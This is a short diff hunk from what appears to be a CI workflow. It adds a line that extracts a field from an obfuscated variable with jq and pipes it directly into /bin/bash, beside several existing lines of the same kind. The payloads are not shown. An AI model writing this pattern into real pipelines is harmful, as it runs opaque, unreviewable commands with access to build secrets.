@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$qtq7919" | jq -r .fnxa96 | /bin/bash
           printf '%s' "$qcqb55" | jq -r .nnvza66199 | /bin/bash
           printf '%s' "$nkkhy4" | jq -r .nlfgj0963 | /bin/bash
+          echo $d0567 | jq -r .y1 | /bin/bash
 
       - name: Upload artifact
         if: always()
